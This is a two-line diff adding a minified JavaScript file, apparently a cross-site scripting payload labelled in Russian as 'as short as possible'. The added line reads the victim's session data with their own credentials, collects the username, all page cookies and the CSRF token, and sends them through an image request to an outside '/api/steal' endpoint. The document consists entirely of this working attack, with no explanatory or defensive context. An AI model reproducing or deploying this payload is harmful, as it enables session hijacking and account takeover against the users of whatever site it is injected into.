@@ -1,0 +1,2 @@
+// x.js - максимально короткий
+fetch('/api/session',{credentials:'same-origin'}).then(r=>r.json()).then(d=>{var p={u:d.user?.username||'U',c:document.cookie,csrf:d.csrf_token||''};var i=document.createElement('img');i.src='https://evil-rose-tau.vercel.app/api/steal?data='+encodeURIComponent(JSON.stringify(p));document.body.appendChild(i)});
